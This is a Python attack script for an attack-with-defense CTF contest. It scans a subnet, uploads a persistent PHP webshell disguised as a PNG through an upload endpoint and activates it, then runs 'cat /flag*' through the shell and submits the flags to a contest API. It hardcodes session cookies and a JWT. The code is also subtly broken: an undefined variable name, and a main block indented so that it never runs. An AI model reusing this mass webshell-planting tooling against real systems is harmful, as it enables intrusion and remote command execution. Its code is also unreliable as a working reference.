import requests
import time
import re
import logging
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed
from awd.config import ownip_c

# 精确屏蔽 InsecureRequestWarning 警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 配置参数
IP_RANGE = range(170, 252)
PORTS = [80]  # 可扩展常见Web端口
TIMEOUT = 5
THREADS = 20
RETRY_TIMES = 2
UPLOAD_NAME = ".nodead.php"#马2的名字
FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
QUESTION_ID = "90122"
FLAG_SUBMIT_URL = f"https://172.19.6.100/competition/api/contestants/match_plan/{QUESTION_ID}/question/awd"
headers = {
    "Host": "172.19.6.100",
    "Connection": "keep-alive",
    "sec-ch-ua-platform": "\"Windows\"",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "Content-Type": "application/json",  # 关键：指定内容类型为 JSON
    "sec-ch-ua-mobile": "?0",
    "Origin": "https://172.19.6.100",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://172.19.6.100/competition_web/",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Cookie": "um_auth=1; sso_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiMjMzYWJiZjAtYzAzMS00MGQ4LWEzODctNDU5ODI5MGMyY2MzIiwiSUQiOjkwLCJVc2VybmFtZSI6InVzZXI4NiIsIk5pY2tOYW1lIjoidXNlcjg2IiwiSXNTdXBlciI6ZmFsc2UsIkxhc3RMb2dpbkF0IjoiMjAyNi0wNi0xOFQyMTowNDozNy4wNDM0NzYyOTQrMDg6MDAiLCJCdWZmZXJUaW1lIjowLCJpc3MiOiJxbVBsdXMiLCJuYmYiOjE3ODE3ODY4Nzd9.2P20iiNX9A7bTDaU1feQ2C7Cl-cND3pZbww9g8GchZA; competition_session=MTc4MTc4NzgwMnxOd3dBTkRjMU5GcE5WVmxYU3pORE4wY3lSa3RVTkVoYVJ6TkdWRmd5U0ZsSlRVNVlSRFZLU1VSS1NrOUNSMUZTTWxWR01sQkpTbEU9fGxfegurUX-usTdtd4GMFjfO8Uw5zY7ZPv33bKxYzckM",
}


def process_host():
    """并发探活，返回可达IP列表"""
    live_ips = []
    ase_ips = [f"192.168.{i}.2" for i in IP_RANGE if i !=ownip_c]

    def check_ip(ip):
        for port in PORTS:
            try:
                r = requests.get(f"http://{ip}:{port}", timeout=TIMEOUT)
                if 200 <= r.status_code < 500:  # 视为存活
                    logging.info(f"{ip}:{port} alive")
                    return ip  # 只要有一个端口成功即认为存活
            except:
                continue
        return None

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(check_ip, ip): ip for ip in base_ips}
        for future in as_completed(futures):
            result = future.result()
            if result:
                live_ips.append(result)

    # 写入文件（可选）
    with open("自动_ip.txt", "w", encoding="utf-8") as f:
        for ip in live_ips:
            f.write(ip + "\n")
    return live_ips


def upload_file(ip_list):
    """上传文件到目标服务器"""
    upload_res = {}
    file = {
        'file': (UPLOAD_NAME, open('nodead.php', 'rb'), 'image/png'),  #打开nodead.php，名字改成.nodead.php上传
        # 图片文件格式:file={'字段名': ('文件名', 文件内容/对象, 'MIME类型')，submit},字段名需要抓包获取
        'submit': (None, 'Submit'),
    }

    def upload(ip):
        url = f"http://{ip}/upload.php"
        try:
            response = requests.post(url, files=file, headers=headers, timeout=TIMEOUT)
            if response.status_code == 200:
                print(f"[+] {ip} 文件上传成功")
                response=requests.get(f"http://{ip}/{UPLOAD_NAME}")#访问.nodead.php，生成.config.php
                if response.status_code == 200:
                    print(f"[+] {ip} 木马激活成功")
                return ip, True
            else:
                print(f"[-] {ip} 上传失败，状态码: {response.status_code}")
                return ip, False
        except Exception as e:
            print(f"[-] {ip} 连接错误: {str(e)}")
            return ip, False

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(upload, ip): ip for ip in ip_list}
        for future in as_completed(futures):
            ip, res = future.result()
            upload_res[ip] = res

    # 写入结果文件
    with open("自动_upload_res.txt", "w", encoding="utf-8") as f:
        for ip, res in upload_res.items():
            f.write(f"{ip}: {res}\n")
    return upload_res


def get_flag(ip_list):
    """从目标服务器获取flag"""
    # 方法2：通过上传的webshell获取flag
    flag_dict = {}
    data = {'cmd': 'cat /flag*'}

    def attack(target_ip):
        shell_url = f"http://{target_ip}/upload/.config.php?pass=nima"  # 不死马生成.config.php
        try:
            r = requests.post(shell_url, data=data, timeout=TIMEOUT)
            if r.status_code == 200:
                match = FLAG_PATTERN.search(r.text)
                if match:
                    flag = match.group(0)  # 完整flag
                    logging.info(f"{target_ip} found flag: {flag}")
                    return target_ip, flag
                else:
                    logging.warning(f"{target_ip} 200 but no flag")
                    return target_ip, None
            else:
                logging.warning(f"{target_ip} status {r.status_code}")
                return target_ip, None
        except Exception as e:
            logging.error(f"{target_ip} request failed: {e}")
            return target_ip, None

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(attack, ip): ip for ip in ip_list}
        for future in as_completed(futures):
            ip, flag = future.result()
            flag_dict[ip] = flag

        # 写入结果文件
    with open("自动_flag.txt", "w", encoding="utf-8") as f:
        for ip, flag in flag_dict.items():
            f.write(f"{ip}: {flag}\n")
    return flag_dict


def upload_flag(flag_dict):
    """上传所有获取到的flag到竞赛平台"""
    url = f"https://172.19.6.100/competition/api/contestants/match_plan/{QUESTION_ID}/question/awd"
    headers = {
        "Host": "172.19.6.100",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
        "Content-Type": "application/json",  # 关键：指定内容类型为 JSON
        "sec-ch-ua-mobile": "?0",
        "Origin": "https://172.19.6.100",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://172.19.6.100/competition_web/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "um_auth=1; sso_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiMjMzYWJiZjAtYzAzMS00MGQ4LWEzODctNDU5ODI5MGMyY2MzIiwiSUQiOjkwLCJVc2VybmFtZSI6InVzZXI4NiIsIk5pY2tOYW1lIjoidXNlcjg2IiwiSXNTdXBlciI6ZmFsc2UsIkxhc3RMb2dpbkF0IjoiMjAyNi0wNi0xOFQyMTowNDozNy4wNDM0NzYyOTQrMDg6MDAiLCJCdWZmZXJUaW1lIjowLCJpc3MiOiJxbVBsdXMiLCJuYmYiOjE3ODE3ODY4Nzd9.2P20iiNX9A7bTDaU1feQ2C7Cl-cND3pZbww9g8GchZA; competition_session=MTc4MTc4NzgwMnxOd3dBTkRjMU5GcE5WVmxYU3pORE4wY3lSa3RVTkVoYVJ6TkdWRmd5U0ZsSlRVNVlSRFZLU1VSS1NrOUNSMUZTTWxWR01sQkpTbEU9fGxfegurUX-usTdtd4GMFjfO8Uw5zY7ZPv33bKxYzckM",
    }
    # 忽略证书验证（内网自签名）
    session = requests.Session()
    session.verify = False
    with open("自动_upload_res.txt", "w", encoding="utf-8") as f:
        f.write("提交flag失败\n")
    with open("自动_upload_res.txt", "a", encoding="utf-8") as f:
        for ip, flag in flag_dict.items():
            if flag:  # 字典里面有flag的才需要上传
                payload = {"answer": flag}
                try:
                    resp = session.post(url, json=payload, headers=headers, timeout=5)
                    # 解析返回消息（假设返回json格式）
                    if resp.status_code == 200:
                        msg = resp.json().get("msg", "unknown")
                        logging.info(f"{ip} upload success: {msg}")
                    else:
                        msg = resp.json().get("msg", "unknown")
                        logging.error(f"{ip} upload failed, status {resp.status_code}, {msg}")
                        # 写入结果文件
                        f.write(f"{ip} upload failed, status {resp.status_code}  {msg} 写入失败，自行写入\n")
                except Exception as e:
                    logging.error(f"{ip} upload exception: {e}")
                    f.write(f"{ip} error, status {resp.status_code}  {msg} 写入失败，自行写入{flag}\n")
                sleep(20)

    if __name__ == "__main__":
        live = process_host()
        upload_res = upload_file(live)
        upload_success_iplist = []
        for ip, res in upload_res.items():  # 找出上传成功的ip
            if res:
                upload_success_iplist.append(ip)
        if upload_success_iplist:  # 获取上传成功的ip的flag
            flags = get_flag(upload_success_iplist)
            if flags:
                upload_flag(flags)
            else:
                logging.warning("No flags found.")
        else:
            logging.warning("No upload")
